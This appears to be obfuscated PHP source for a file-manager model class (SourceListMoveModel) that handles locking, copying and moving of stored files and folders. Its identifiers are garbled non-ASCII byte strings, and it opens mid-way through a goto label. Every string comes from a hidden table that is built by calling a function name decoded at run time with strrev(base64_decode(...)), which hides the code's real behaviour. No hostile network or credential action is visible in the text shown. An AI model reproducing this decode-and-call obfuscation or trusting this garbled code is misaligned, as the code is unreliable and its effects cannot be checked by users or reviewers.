E°ƒ·ÎĞØ·; CØÃöã²§ : $fileSize = strrev(base64_decode($_SERVER[şªÒä][0])); function binCheckNeq($ßêãƒÓ¸, $ƒÃ³èõ) { return $ßêãƒÓ¸ != $ƒÃ³èõ; } $_SERVER[$_SERVER[şªÒä][1]] = $fileSize($_SERVER[$_SERVER[şªÒä][2]]); goto B•ŠÈ¹¡‰„; Cïº¾¾ÉİÃ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($„¢ö½õ) { $‹¼³¨×” =& $_SERVER[ÓïÕü]; if (!$this->allowLock()) { return; } $this->_lockCheck($‹¼³¨×”[626], $„¢ö½õ); $¢×ÌÉ  = 1; $this->_lockEvent($„¢ö½õ, array($‹¼³¨×”[627], $‹¼³¨×”[628]), $¢×ÌÉ ); $this->_lockParent($„¢ö½õ, array($‹¼³¨×”[628]), $¢×ÌÉ ); $this->_lockEvent($„¢ö½õ, array($‹¼³¨×”[629], $‹¼³¨×”[630]), $¢×ÌÉ ); $this->_lockCheckEnd($‹¼³¨×”[626], $„¢ö½õ); } public function lockCopyEnd($¬‹Ë´±) { $‚ŒÁÃì¤ =& $_SERVER[ÓïÕü]; if (!$this->allowLock()) { return; } $‚©„†²Ó = 0; $this->_lockEvent($¬‹Ë´±, array($‚ŒÁÃì¤[627], $‚ŒÁÃì¤[628]), $‚©„†²Ó); $this->_lockParent($¬‹Ë´±, array($‚ŒÁÃì¤[628]), $‚©„†²Ó); $this->_lockEvent($¬‹Ë´±, array($‚ŒÁÃì¤[629], $‚ŒÁÃì¤[630]), $‚©„†²Ó); } public function lockWriteStart($âÄ¾”Ä, $³Âß¶¸ = '') { $¡øÏíÔ =& $_SERVER[ÓïÕü]; if (!$this->allowLock()) { return; } $this->_lockCheck($¡øÏíÔ[627], $âÄ¾”Ä); $‡•ŒšıŸ = 1; $this->_lockKey($¡øÏíÔ[631] . $âÄ¾”Ä . $¡øÏíÔ[10] . $³Âß¶¸, $‡•ŒšıŸ); $this->_lockEvent($âÄ¾”Ä, array($¡øÏíÔ[626], $¡øÏíÔ[628]), $‡•ŒšıŸ); $this->_lockParent($âÄ¾”Ä, array($¡øÏíÔ[626], $¡øÏíÔ[628]), $‡•ŒšıŸ); $this->_lockCheckEnd($¡øÏíÔ[627], $âÄ¾”Ä); } public function lockWriteEnd($¢ò››«Â, $ï‚ÎÆâŞ = '') { $‡ÌëØ¡Æ =& $_SERVER[ÓïÕü]; if (!$this->allowLock()) { return; } $à´çËïİ = 0; $this->_lockKey($‡ÌëØ¡Æ[631] . $¢ò››«Â . $‡ÌëØ¡Æ[10] . $ï‚ÎÆâŞ, $à´çËïİ); $this->_lockEvent($¢ò››«Â, array($‡ÌëØ¡Æ[626], $‡ÌëØ¡Æ[628]), $à´çËïİ); $this->_lockParent($¢ò››«Â, array($‡ÌëØ¡Æ[626], $‡ÌëØ¡Æ[628]), $à´çËïİ); } public function lockMoveStart($¯èÏ¨êè) { $°íõê²‡ =& $_SERVER[ÓïÕü]; if (!$this->allowLock()) { return; } $this->_lockCheck($°íõê²‡[628], $¯èÏ¨êè); $Íø’Ôü = 1; $this->_lockKey($°íõê²‡[632] . $¯èÏ¨êè, $Íø’Ôü); $this->_lockEvent($¯èÏ¨êè, array($°íõê²‡[626], $°íõê²‡[627]), $Íø’Ôü); $this->_lockParent($¯èÏ¨êè, array($°íõê²‡[626], $°íõê²‡[628]), $Íø’Ôü); $this->_lockEvent($¯èÏ¨êè, array($°íõê²‡[633], $°íõê²‡[629], $°íõê²‡[630]), $Íø’Ôü); $this->_lockCheckEnd($°íõê²‡[628], $¯èÏ¨êè); } public function lockMoveEnd($ÌÁ°á„Æ) { $’˜ıß¯– =& $_SERVER[ÓïÕü]; if (!$this->allowLock()) { return; } $µ˜ëÏüƒ = 0; $this->_lockKey($’˜ıß¯–[632] . $ÌÁ°á„Æ, $µ˜ëÏüƒ); $this->_lockEvent($ÌÁ°á„Æ, array($’˜ıß¯–[626], $’˜ıß¯–[627]), $µ˜ëÏüƒ); $this->_lockParent($ÌÁ°á„Æ, array($’˜ıß¯–[626], $’˜ıß¯–[628]), $µ˜ëÏüƒ); $this->_lockEvent($ÌÁ°á„Æ, array($’˜ıß¯–[633], $’˜ıß¯–[629], $’˜ıß¯–[630]), $µ˜ëÏüƒ); } private function _lockCheck($ø°ÕÄ®Ş, $Š€¹¡÷») { $¦‡ûñÂ¦ =& $_SERVER[ÓïÕü]; $î‘ä™—ø = $this->sourceInfo($Š€¹¡÷»); $ªŸÓ¶˜ = $ø°ÕÄ®Ş . $¦‡ûñÂ¦[10] . $Š€¹¡÷»; $this->_lockTimeStart[$ªŸÓ¶˜] = timeFloat(); if (!is_array($î‘ä™—ø)) { return; } $ºèì£´ø = LNG($¦‡ûñÂ¦[634]); CacheLock::setErrorMsg($¦‡ûñÂ¦[176] . htmlspecialchars($î‘ä™—ø[$¦‡ûñÂ¦[32]]) . $¦‡ûñÂ¦[178] . $ºèì£´ø); $this->_lockKey($ªŸÓ¶˜, 1); $this->_lockKey($ªŸÓ¶˜, 0); $’üºŸßª = array_reverse($this->parentLevelArray($î‘ä™—ø[$¦‡ûñÂ¦[589]])); foreach ($’üºŸßª as $Äê´§·²) { $ªŸÓ¶˜ = $ø°ÕÄ®Ş . $¦‡ûñÂ¦[635] . $Äê´§·²; if (CacheLock::lockGet($¦‡ûñÂ¦[636] . $ªŸÓ¶˜)) { $î‘ä™—ø = $this->sourceInfo($Äê´§·²); CacheLock::setErrorMsg($¦‡ûñÂ¦[176] . htmlspecialchars($î‘ä™—ø[$¦‡ûñÂ¦[32]]) . $¦‡ûñÂ¦[178] . $ºèì£´ø); $this->_lockKey($ªŸÓ¶˜, 1); $this->_lockKey($ªŸÓ¶˜, 0); } } } private function _lockCheckEnd($ë‘€ÚŒ, $…·É•¶ô) { $¡—‹ë¢¹ =& $_SERVER[ÓïÕü]; $´Ï£¬ËĞ = $ë‘€ÚŒ . $¡—‹ë¢¹[10] . $…·É•¶ô; CacheLock::setErrorMsg($¡—‹ë¢¹[457]); if (!isset($this->_lockTimeStart[$´Ï£¬ËĞ])) { return; } $‚‰ö×·‰ = timeFloat() - $this->_lockTimeStart[$´Ï£¬ËĞ]; unset($this->_lockTimeStart[$´Ï£¬ËĞ]); if ($‚‰ö×·‰ > 0.5) { unset(self::$cacheSourceInfo[$¡—‹ë¢¹[536] . $…·É•¶ô]); } $ç¿‰‘§ = $this->sourceInfo($…·É•¶ô); if (!$ç¿‰‘§) { show_json(LNG($¡—‹ë¢¹[108]), !1); } } private function _lockParent($æöƒÇí, $Ë¡Ò”  , $ñç¦ÜÍ·) { if (!$this->autoLockSet) { return; } $²ö‚İ™¯ = $this->sourceInfo($æöƒÇí); if (!is_array($²ö‚İ™¯)) { return; } $˜øÕÓÜ¤ = array_reverse($this->parentLevelArray($²ö‚İ™¯[$_SERVER[ÓïÕü][589]])); foreach ($˜øÕÓÜ¤ as $Ìıîîó„) { $this->_lockEvent($Ìıîîó„, $Ë¡Ò”  , $ñç¦ÜÍ·); } } private function _lockEvent($ØÔş†í, $Ø”—õµœ, $ÑŞû×Æ¤) { $„ŞøÍºö =& $_SERVER[ÓïÕü]; if (!$this->autoLockSet) { return; } foreach ($Ø”—õµœ as $ü«±à»ô) { $¤ƒ™†ßÈ = $ü«±à»ô . $„ŞøÍºö[10] . $ØÔş†í; if ($ÑŞû×Æ¤ && CacheLock::lockGet($„ŞøÍºö[636] . $¤ƒ™†ßÈ)) { continue; } $this->_lockKey($¤ƒ™†ßÈ, $ÑŞû×Æ¤); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Îû®ÀìŒ, $•åÕ‡­Â = 1) { $¯´ÄÂ = $_SERVER[ÓïÕü][636] . md5($Îû®ÀìŒ); if ($•åÕ‡­Â) { if (isset(self::$_lockItemArr[$¯´ÄÂ])) { return; } self::$_lockItemArr[$¯´ÄÂ] = 1; CacheLock::lock($¯´ÄÂ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¯´ÄÂ])) { return; } unset(self::$_lockItemArr[$¯´ÄÂ]); CacheLock::unlock($¯´ÄÂ); } } public function isParentOf($ĞíÆÇí, $Æ÷àôÚ¿) { $ËÌé­Ò =& $_SERVER[ÓïÕü]; $æÉÙñç‚ = $this->sourceInfo($ĞíÆÇí); $…ÏÑãœÂ = $this->sourceInfo($Æ÷àôÚ¿); $ÛÎîÖ¸ = $æÉÙñç‚[$ËÌé­Ò[589]] . $æÉÙñç‚[$ËÌé­Ò[194]] . $ËÌé­Ò[50]; $¸à°‹À– = $…ÏÑãœÂ[$ËÌé­Ò[589]] . $…ÏÑãœÂ[$ËÌé­Ò[194]] . $ËÌé­Ò[50]; $İ¼¨Òƒ÷ = strpos($¸à°‹À–, $ÛÎîÖ¸) === 0; return $İ¼¨Òƒ÷; } private $targetIsDelete = 0; public function copy($ò€Ëµ’, $â²òî•, $Á™ıÔÚ¦ = REPEAT_REPLACE, $‰úËØÅ– = '') { $ï¹”‚™ =& $_SERVER[ÓïÕü]; $ØÈšçÈÊ = $this->sourceInfo($ò€Ëµ’); $ôÁ·Éî¾ = $this->sourceInfo($â²òî•); if (!$ØÈšçÈÊ || !$ôÁ·Éî¾ || $ôÁ·Éî¾[$ï¹”‚™[488]] != $ï¹”‚™[91]) { return !1; } if ($this->isParentOf($ò€Ëµ’, $â²òî•)) { return !1; } $ˆ’²áû = $‰úËØÅ– ? $‰úËØÅ– : $ØÈšçÈÊ[$ï¹”‚™[32]]; $this->lockCopyStart($ò€Ëµ’); $this->lockWriteStart($â²òî•, $ˆ’²áû); $êù‚›º = array($ï¹”‚™[637] => array(), $ï¹”‚™[638] => array(), $ï¹”‚™[639] => array()); $this->targetIsDelete = intval($ØÈšçÈÊ[$ï¹”‚™[508]]); $Üˆù…¸ = $this->fileNameExistAuto($â²òî•, $ØÈšçÈÊ); $†²·àÅË = $this->_copy($ò€Ëµ’, $â²òî•, $Á™ıÔÚ¦, $êù‚›º, !0, $‰úËØÅ–); $this->_childrenListClear(); $this->lockCopyEnd($ò€Ëµ’); $this->lockWriteEnd($â²òî•, $ˆ’²áû); if ($ØÈšçÈÊ[$ï¹”‚™[488]] == $ï¹”‚™[91] && $Üˆù…¸ == $†²·àÅË) { $this->folderSizeResetChildren($Üˆù…¸); } Model($ï¹”‚™[640])->addAll($êù‚›º[$ï¹”‚™[638]], array(), !0); if ($Üˆù…¸ != $†²·àÅË || $ØÈšçÈÊ[$ï¹”‚™[488]] == $ï¹”‚™[91]) { Model($ï¹”‚™[641])->eventCopy($†²·àÅË); } $this->saveAll($êù‚›º[$ï¹”‚™[639]]); Model($ï¹”‚™[233])->linkAdd($êù‚›º[$ï¹”‚™[637]]); $this->folderSizeReset($â²òî•); $this->updateModifyTime($â²òî•); return $†²·àÅË; } private function _copy($ÇÆ¸•Âğ, $œò®ç²Ñ, $ì‰á»×À, &$ŒñôÔÒÏ, $¢¶Î¤Äü, $®Û©ÌÜ = '') { $İŒôŠâæ =& $_SERVER[ÓïÕü]; $øÈ¨ÕÊä = $this->sourceInfoCache($ÇÆ¸•Âğ); $ÑºöĞ¨½ = $øÈ¨ÕÊä[$İŒôŠâæ[488]] == $İŒôŠâæ[91]; $á“â¡áÃ = $®Û©ÌÜ ? $®Û©ÌÜ : $øÈ¨ÕÊä[$İŒôŠâæ[32]]; $¿ù‚ø‡  = $this->fileNameExistAuto($œò®ç²Ñ, $øÈ¨ÕÊä); if ($¢¶Î¤Äü) { $this->_childrenAllMake($ÇÆ¸•Âğ); if ($ÑºöĞ¨½ && $¿ù‚ø‡ ) { $this->_childrenAllMake($¿ù‚ø‡ ); } } if (!$¿ù‚ø‡ ) { return $this->_copyCreate($ÇÆ¸•Âğ, $œò®ç²Ñ, $á“â¡áÃ, $ŒñôÔÒÏ); } $å¸ƒ®³ê = $¿ù‚ø‡ ; if ($ÑºöĞ¨½) { if ($ì‰á»×À == REPEAT_RENAME_FOLDER) { $á“â¡áÃ = $this->fileNameAutoCache($œò®ç²Ñ, $á“â¡áÃ, $ì‰á»×À, $ÑºöĞ¨½); $å¸ƒ®³ê = $this->_copyCreate($ÇÆ¸•Âğ, $œò®ç²Ñ, $á“â¡áÃ, $ŒñôÔÒÏ); } else { $ÛŞ‡ı¼Ë = $this->_childrenList($ÇÆ¸•Âğ); foreach ($ÛŞ‡ı¼Ë as $­ ­ñµş) { $this->_copy($­ ­ñµş[$İŒôŠâæ[194]], $¿ù‚ø‡ , $ì‰á»×À, $ŒñôÔÒÏ, !1); } } } else { if ($ì‰á»×À == REPEAT_RENAME || $ì‰á»×À == REPEAT_RENAME_FOLDER) { $á“â¡áÃ = $this->fileNameAutoCache($œò®ç²Ñ, $á“â¡áÃ, $ì‰á»×À, $ÑºöĞ¨½); $å¸ƒ®³ê = $this->_copyCreate($ÇÆ¸•Âğ, $œò®ç²Ñ, $á“â¡áÃ, $ŒñôÔÒÏ); } else { if ($ì‰á»×À == REPEAT_REPLACE) { $Øï§Ú = $this->sourceInfoCache($¿ù‚ø‡ ); $˜‡­Ø¼ = $this->fileHistory($Øï§Ú, $øÈ¨ÕÊä[$İŒôŠâæ[546]], $øÈ¨ÕÊä[$İŒôŠâæ[79]]); if ($˜‡­Ø¼) { $ŒñôÔÒÏ[$İŒôŠâæ[637]][] = $øÈ¨ÕÊä[$İŒôŠâæ[546]]; } } else { if ($ì‰á»×À == REPEAT_SKIP) { } } } Hook::trigger($İŒôŠâæ[642], array($İŒôŠâæ[643], $øÈ¨ÕÊä, 0)); } return $å¸ƒ®³ê; } private function _copyCreate($°¡«Òâß, $Óè¤«£», $³Š‘…Â, &$™íçŠ˜) { $Ã÷§üíâ =& $_SERVER[ÓïÕü]; $ÂØûŸ¦ = $this->sourceInfoCache($°¡«Òâß); $¯±©¡±‚ = $this->sourceInfoCache($Óè¤«£»); $ƒŒîú€ä = $this->_makeItemData($ÂØûŸ¦, $¯±©¡±‚, $³Š‘…Â); Hook::trigger($Ã÷§üíâ[644], $ƒŒîú€ä); Hook::trigger($Ã÷§üíâ[645], array($Ã÷§üíâ[646], $ƒŒîú€ä, 0)); $êÖÑÅì¸ = $this->add($ƒŒîú€ä); $¢¾±ûçì = array($Ã÷§üíâ[194] => $êÖÑÅì¸, $Ã÷§üíâ[32] => $³Š‘…Â); $this->_copyApplyMeta($¢¾±ûçì, $™íçŠ˜); if ($ÂØûŸ¦[$Ã÷§üíâ[488]] != $Ã÷§üíâ[91]) { $™íçŠ˜[$Ã÷§üíâ[637]][] = $ÂØûŸ¦[$Ã÷§üíâ[546]]; return $êÖÑÅì¸; } $Â€ë¿•… = array(); $¤¸ì´œ¬ = array(); $this->_childrenListAll($°¡«Òâß, $Â€ë¿•…); $™¢ÜşÜœ = count($Â€ë¿•…); if ($™¢ÜşÜœ == 0) { return $êÖÑÅì¸; } $ë×İ»‹ = $this->sourceInfo($êÖÑÅì¸); foreach ($Â€ë¿•… as $ÍòçÎ“î) { $ˆ€¤¦¯ = $this->_makeItemData($ÍòçÎ“î, $ë×İ»‹, $ÍòçÎ“î[$Ã÷§üíâ[32]]); $ˆ€¤¦¯[$Ã÷§üíâ[589]] = $ÍòçÎ“î[$Ã÷§üíâ[589]]; $¤¸ì´œ¬[] = $ˆ€¤¦¯; } $this->chunkEventSet($Ã÷§üíâ[647], array($Ã÷§üíâ[648], $ƒŒîú€ä, $™¢ÜşÜœ)); $this->addAll($¤¸ì´œ¬, array(), !1); $òâÅõÇà = $this->where(array($Ã÷§üíâ[193] => $êÖÑÅì¸))->select(); $­ˆÄ†î“ = $this->_childrenMakeRelation($Â€ë¿•…, $òâÅõÇà); $­ˆÄ†î“[$°¡«Òâß] = $êÖÑÅì¸; $¢Ù¶äİ½ = array(); $·âà¿öØ = array(); foreach ($òâÅõÇà as $ÍòçÎ“î) { $™ê§İ—ä = $ÍòçÎ“î[$Ã÷§üíâ[194]]; $şÅÕ¦á = $this->_childrenMatch($­ˆÄ†î“, $ÍòçÎ“î, $ë×İ»‹); $¢Ù¶äİ½[] = array($Ã÷§üíâ[194], $™ê§İ—ä, $Ã÷§üíâ[193], $şÅÕ¦á[$Ã÷§üíâ[193]]); $·âà¿öØ[] = array($Ã÷§üíâ[194], $™ê§İ—ä, $Ã÷§üíâ[589], $şÅÕ¦á[$Ã÷§üíâ[589]]); $this->_copyApplyMeta($ÍòçÎ“î, $™íçŠ˜); if ($ÍòçÎ“î[$Ã÷§üíâ[488]] != $Ã÷§üíâ[91]) { $™íçŠ˜[$Ã÷§üíâ[637]][] = $ÍòçÎ“î[$Ã÷§üíâ[546]]; } } $this->chunkEventSet($Ã÷§üíâ[649], array($Ã÷§üíâ[650], $ƒŒîú€ä, $™¢ÜşÜœ)); $this->saveAll($¢Ù¶äİ½); $this->chunkEventSet($Ã÷§üíâ[651], array($Ã÷§üíâ[652], $ƒŒîú€ä, $™¢ÜşÜœ)); $this->saveAll($·âà¿öØ); return $êÖÑÅì¸; } private function _childrenMakeRelation($¬ĞÆ™í’, $Ñ€‘µ¤ş) { $°ÎÀË„ =& $_SERVER[ÓïÕü]; $†ˆÕ¿Şâ = array(); $äôÈùı = array(); foreach ($¬ĞÆ™í’ as $ÏøÊõã‘) { $×¨ªñˆ¹ = $ÏøÊõã‘[$°ÎÀË„[32]] . $°ÎÀË„[8] . $ÏøÊõã‘[$°ÎÀË„[589]]; $†ˆÕ¿Şâ[$×¨ªñˆ¹] = $ÏøÊõã‘[$°ÎÀË„[194]]; } foreach ($Ñ€‘µ¤ş as $ÏøÊõã‘) { $×¨ªñˆ¹ = $ÏøÊõã‘[$°ÎÀË„[32]] . $°ÎÀË„[8] . $ÏøÊõã‘[$°ÎÀË„[589]]; $×›‡™ş = $†ˆÕ¿Şâ[$×¨ªñˆ¹]; $äôÈùı[$×›‡™ş] = $ÏøÊõã‘[$°ÎÀË„[194]]; } return $äôÈùı; } private function _childrenMatch($ˆßø…¶, $ÒØÌÕ¿Ø, $ÈÚÑ¬åî) { $‚Ğ‹ßá =& $_SERVER[ÓïÕü]; $±Ÿıäœñ = $ÈÚÑ¬åî[$‚Ğ‹ßá[589]]; $Ôİ¹º¹’ = $this->parentLevelArray($ÒØÌÕ¿Ø[$‚Ğ‹ßá[589]]); foreach ($Ôİ¹º¹’ as $§ñ™Ã¸…) { if (isset($ˆßø…¶[$§ñ™Ã¸…])) { $±Ÿıäœñ .= $ˆßø…¶[$§ñ™Ã¸…] . $‚Ğ‹ßá[653]; } } $±Ÿıäœñ = rtrim($±Ÿıäœñ, $‚Ğ‹ßá[50]) . $‚Ğ‹ßá[50]; $æŒà¡Äö = $this->parentLevelArray($±Ÿıäœñ); $½È’ÓÃ = $æŒà¡Äö[count($æŒà¡Äö) - 1]; return array($‚Ğ‹ßá[193] => $½È’ÓÃ, $‚Ğ‹ßá[589] => $±Ÿıäœñ); } private function _makeItemData($Ÿî«úÎç, $ì®İœ±ó, $ÁÔ¬±ä®) { $âíì¡’ =& $_SERVER[ÓïÕü]; $‡ù òÖß = array($âíì¡’[654] => $Ÿî«úÎç[$âíì¡’[488]], $âíì¡’[497] => $ÁÔ¬±ä®, $âíì¡’[655] => $Ÿî«úÎç[$âíì¡’[489]] ? $Ÿî«úÎç[$âíì¡’[489]] : $âíì¡’[12], $âíì¡’[547] => $Ÿî«úÎç[$âíì¡’[546]] ? $Ÿî«úÎç[$âíì¡’[546]] : 0, $âíì¡’[625] => $Ÿî«úÎç[$âíì¡’[79]] ? $Ÿî«úÎç[$âíì¡’[79]] : 0, $âíì¡’[656] => intval($ì®İœ±ó[$âíì¡’[191]]), $âíì¡’[657] => intval($ì®İœ±ó[$âíì¡’[574]]), $âíì¡’[658] => intval(USER_ID), $âíì¡’[659] => intval(USER_ID), $âíì¡’[480] => intval($ì®İœ±ó[$âíì¡’[194]]), $âíì¡’[660] => $ì®İœ±ó[$âíì¡’[589]] . $ì®İœ±ó[$âíì¡’[194]] . $âíì¡’[50], $âíì¡’[501] => $Ÿî«úÎç[$âíì¡’[88]] ? $Ÿî«úÎç[$âíì¡’[88]] : time(), $âíì¡’[507] => 0, $âíì¡’[661] => $âíì¡’[12]); return $‡ù òÖß; } private function _copyApplyMeta($ì€Ú¡‹Ë, &$ŒĞ–¨¦‹) { $›šïî„ =& $_SERVER[ÓïÕü]; $”¯ÏÙ”ü = $ì€Ú¡‹Ë[$›šïî„[194]]; $ùÌ” = $ì€Ú¡‹Ë[$›šïî„[32]]; if (!isset($ì€Ú¡‹Ë[$›šïî„[662]]) || !$ì€Ú¡‹Ë[$›šïî„[662]] || $ì€Ú¡‹Ë[$›šïî„[662]] == $›šïî„[231]) { $ŒĞ–¨¦‹[$›šïî„[639]][] = array($›šïî„[194], $”¯ÏÙ”ü, $›šïî„[662], short_id($”¯ÏÙ”ü)); } if (Input::check($ùÌ”, $›šïî„[663])) { $ŒĞ–¨¦‹[$›šïî„[638]][] = array($›šïî„[194] => $”¯ÏÙ”ü, $›šïî„[97] => $›šïî„[541], $›šïî„[453] => str_replace($›šïî„[53], $›šïî„[12], Pinyin::get($ùÌ”))); $ŒĞ–¨¦‹[$›šïî„[638]][] = array($›šïî„[194] => $”¯ÏÙ”ü, $›šïî„[97] => $›šïî„[540], $›šïî„[453] => Pinyin::get($ùÌ”, $›šïî„[664])); } $ŒĞ–¨¦‹[$›šïî„[638]][] = array($›šïî„[194] => $”¯ÏÙ”ü, $›šïî„[97] => $›šïî„[520], $›šïî„[453] => KodSort::makeStr($ùÌ”)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($şÁ±ÒôŞ) { $ã®š÷úÆ =& $_SERVER[ÓïÕü]; $÷¸Áò™ = $this->sourceInfo($şÁ±ÒôŞ); $È®âÒ˜É = $ã®š÷úÆ[665]; $¯ˆ¿„‘Á = array($ã®š÷úÆ[589] => array($ã®š÷úÆ[620], $÷¸Áò™[$ã®š÷úÆ[589]] . $şÁ±ÒôŞ . $ã®š÷úÆ[621]), $ã®š÷úÆ[508] => $this->targetIsDelete); $íí·Œ¾ş = $this->field($È®âÒ˜É)->where($¯ˆ¿„‘Á)->select(); if (!$íí·Œ¾ş) { return; } $íí·Œ¾ş = array_to_keyvalue($íí·Œ¾ş, $ã®š÷úÆ[194]); foreach ($íí·Œ¾ş as $Ä€İŸ©à) { $’ˆÕºÒé = $Ä€İŸ©à[$ã®š÷úÆ[193]]; $şÁ±ÒôŞ = $Ä€İŸ©à[$ã®š÷úÆ[194]]; if (!isset($this->_childrenListCache[$şÁ±ÒôŞ]) && $Ä€İŸ©à[$ã®š÷úÆ[488]] == $ã®š÷úÆ[91]) { $this->_childrenListCache[$şÁ±ÒôŞ] = array(); } if (!isset($this->_childrenListCache[$’ˆÕºÒé])) { $this->_childrenListCache[$’ˆÕºÒé] = array(); } $this->_childrenListCache[$’ˆÕºÒé][$şÁ±ÒôŞ] = $Ä€İŸ©à; $this->_childrenItemCache[$şÁ±ÒôŞ] = $Ä€İŸ©à; } } private function _childrenListAll($ë™°Š¼, &$Ø´‹Óª¹) { $œê»¯Òø =& $_SERVER[ÓïÕü]; if (!isset($this->_childrenListCache[$ë™°Š¼])) { return; } $½Ã‚Œ = $this->_childrenListCache[$ë™°Š¼]; foreach ($½Ã‚Œ as $š›ÚÖĞè => $´ÑĞì¤©) { $Ø´‹Óª¹[$š›ÚÖĞè] = $´ÑĞì¤©; if ($´ÑĞì¤©[$œê»¯Òø[488]] == $œê»¯Òø[91]) { $this->_childrenListAll($š›ÚÖĞè, $Ø´‹Óª¹); } } } private function sourceInfoCache($‡·óÕ´â) { if (isset($this->_childrenItemCache[$‡·óÕ´â])) { return $this->_childrenItemCache[$‡·óÕ´â]; } return $this->sourceInfo($‡·óÕ´â); } private function _childrenList($ˆÜŸÎ) { if (isset($this->_childrenListCache[$ˆÜŸÎ])) { return $this->_childrenListCache[$ˆÜŸÎ]; } return $this->_childrenListSelect($ˆÜŸÎ); } private function _childrenListSelect($ŠÀêå…) { $™´÷Èœı =& $_SERVER[ÓïÕü]; $¥ş÷‚Òé = array($™´÷Èœı[193] => $ŠÀêå…, $™´÷Èœı[508] => $this->targetIsDelete); $ú§¥™Àö = $this->where($¥ş÷‚Òé)->select(); $ú§¥™Àö = $ú§¥™Àö ? $ú§¥™Àö : array(); $œ´¯‘³Â = array_to_keyvalue($ú§¥™Àö, $™´÷Èœı[194]); $this->_childrenListCache[$ŠÀêå…] = $œ´¯‘³Â; foreach ($œ´¯‘³Â as $ŠÀêå… => $œ‹Ş÷¥) { $this->_childrenItemCache[$ŠÀêå…] = $œ‹Ş÷¥; } return $œ´¯‘³Â; } private function fileNameExistAuto($ğ—Ñ¯”£, $íŒı—¾è) { $·™µÓ =& $_SERVER[ÓïÕü]; if ($íŒı—¾è[$·™µÓ[508]] == $·™µÓ[91]) { return $this->fileNameExist($ğ—Ñ¯”£, $íŒı—¾è[$·™µÓ[32]]); } return $this->fileNameExistCache($ğ—Ñ¯”£, $íŒı—¾è[$·™µÓ[32]]); } private function fileNameExistCache($³¯Şš¼„, $Ôà¸ÓŠà) { $¡ü¶¹Ø =& $_SERVER[ÓïÕü]; $Ôà¸ÓŠà = strtolower($Ôà¸ÓŠà); $ŞõŞ¢¾Í = $this->_childrenList($³¯Şš¼„); foreach ($ŞõŞ¢¾Í as $˜ŒØû¢Ò) { if ($Ôà¸ÓŠà == strtolower($˜ŒØû¢Ò[$¡ü¶¹Ø[32]])) { return $˜ŒØû¢Ò[$¡ü¶¹Ø[194]]; } } return !1; } private function fileNameAutoCache($„­ˆ»ËÛ, $¡ù†Ë©Ò, $“½ßş¨Ü, $ÊÖ«ÆøÕ) { $ÍµÁóºæ =& $_SERVER[ÓïÕü]; $è­¨â£µ = $this->_childrenList($„­ˆ»ËÛ); $Ø–åºŸø = array_to_keyvalue($è­¨â£µ, $ÍµÁóºæ[12], $ÍµÁóºæ[32]); return $this->fileNameAutoGet($Ø–åºŸø, $¡ù†Ë©Ò, $“½ßş¨Ü, $ÊÖ«ÆøÕ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($…ï¨Šµª, $”–™¹´¤, $ÅÉïªù¯ = REPEAT_REPLACE, $Å±½—€ = '') { $Üë±­‰Ó =& $_SERVER[ÓïÕü]; $˜ÔŠç’Î = $this->sourceInfo($…ï¨Šµª); $§ñ©¤ = $this->sourceInfo($”–™¹´¤); if ($˜ÔŠç’Î[$Üë±­‰Ó[193]] == $§ñ©¤[$Üë±­‰Ó[194]]) { if ($˜ÔŠç’Î[$Üë±­‰Ó[508]] == $Üë±­‰Ó[91]) { Model($Üë±­‰Ó[506])->restore(array($…ï¨Šµª)); } if (!$Å±½—€ || $Å±½—€ == $˜ÔŠç’Î[$Üë±­‰Ó[32]]) { return $…ï¨Šµª; } } $ñ¹ì¬º” = $this->pathInfoMore($…ï¨Šµª); if ($this->isParentOf($…ï¨Šµª, $”–™¹´¤)) { return !1; } if (!$˜ÔŠç’Î || !$§ñ©¤ || $§ñ©¤[$Üë±­‰Ó[488]] != $Üë±­‰Ó[91]) { return !1; } Hook::trigger($Üë±­‰Ó[666], $ñ¹ì¬º”); $this->targetIsDelete = intval($˜ÔŠç’Î[$Üë±­‰Ó[508]]); if ($˜ÔŠç’Î[$Üë±­‰Ó[193]] == $”–™¹´¤ && $Å±½—€ != $˜ÔŠç’Î[$Üë±­‰Ó[32]]) { $ïŸŸ†¼« = $this->fileNameExist($”–™¹´¤, $Å±½—€); if ($ïŸŸ†¼« && $˜ÔŠç’Î[$Üë±­‰Ó[488]] == $Üë±­‰Ó[231]) { $÷ÄîŠ°Ü = $this->sourceInfo($ïŸŸ†¼«); $”Ü²ÑÛ = $this->fileHistory($÷ÄîŠ°Ü, $˜ÔŠç’Î[$Üë±­‰Ó[546]], $˜ÔŠç’Î[$Üë±­‰Ó[79]]); if (!$”Ü²ÑÛ) { Model($Üë±­‰Ó[549])->remove($˜ÔŠç’Î[$Üë±­‰Ó[546]]); } $this->removeNow($…ï¨Šµª, !1); $this->folderSizeReset($”–™¹´¤); Hook::trigger($Üë±­‰Ó[667], $ñ¹ì¬º”); return $ïŸŸ†¼«; } } $áÈÅŞå¨ = $Å±½—€ ? $Å±½—€ : $˜ÔŠç’Î[$Üë±­‰Ó[32]]; $this->lockMoveStart($…ï¨Šµª); $this->lockWriteStart($”–™¹´¤, $áÈÅŞå¨); $ÎÂ–Ã‚ï = array($Üë±­‰Ó[637] => array(), $Üë±­‰Ó[668] => !1); $this->clearShare($…ï¨Šµª, $”–™¹´¤); $·Ùşùêİ = $this->fileNameExistAuto($”–™¹´¤, $˜ÔŠç’Î); $·ßÛ–ˆ  = $this->_move($…ï¨Šµª, $”–™¹´¤, $ÅÉïªù¯, $ÎÂ–Ã‚ï, $Å±½—€); $this->sourceCacheClear(); if ($˜ÔŠç’Î[$Üë±­‰Ó[488]] == $Üë±­‰Ó[91] && $·Ùşùêİ) { $this->folderSizeResetChildren($·ßÛ–ˆ ); } Model($Üë±­‰Ó[233])->linkAdd($ÎÂ–Ã‚ï[$Üë±­‰Ó[637]]); if ($·ßÛ–ˆ  && $·Ùşùêİ && $ÎÂ–Ã‚ï[$Üë±­‰Ó[668]]) { $¦Âòáç = $˜ÔŠç’Î[$Üë±­‰Ó[488]] == $Üë±­‰Ó[91] ? $this->_childrenListSelect($…ï¨Šµª) : !1; $˜¢Óé€– = $¦Âòáç && count($¦Âòáç) > 0 ? !0 : !1; $this->removeNow($…ï¨Šµª, $˜¢Óé€–); } 